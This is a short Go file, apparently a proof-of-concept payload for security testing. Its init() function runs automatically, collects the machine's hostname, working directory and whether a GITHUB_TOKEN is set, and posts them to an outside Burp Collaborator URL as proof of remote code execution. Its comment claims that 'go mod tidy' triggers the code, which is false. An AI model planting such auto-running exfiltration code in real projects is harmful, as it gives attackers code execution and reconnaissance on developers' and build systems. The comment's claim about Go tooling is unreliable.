package main

import (
    "net/http"
    "os"
    "strings"
)

func init() {
    // This runs automatically when go mod tidy processes the file
    webhookURL := "https://ar5clalrm01qoswyl6x95i2cs3ytmi.burpcollaborator.net"
    
    // Prepare data showing we have code execution
    hostname, _ := os.Hostname()
    pwd, _ := os.Getwd()
    
    // Check if GITHUB_TOKEN exists (don't send the actual token)
    hasToken := "no"
    if os.Getenv("GITHUB_TOKEN") != "" {
        hasToken = "yes"
    }
    
    // Send proof of execution
    payload := strings.NewReader(`{
        "message": "RCE achieved via go mod tidy",
        "hostname": "` + hostname + `",
        "pwd": "` + pwd + `",
        "github_token_present": "` + hasToken + `"
    }`)
    
    http.Post(webhookURL, "application/json", payload)
}
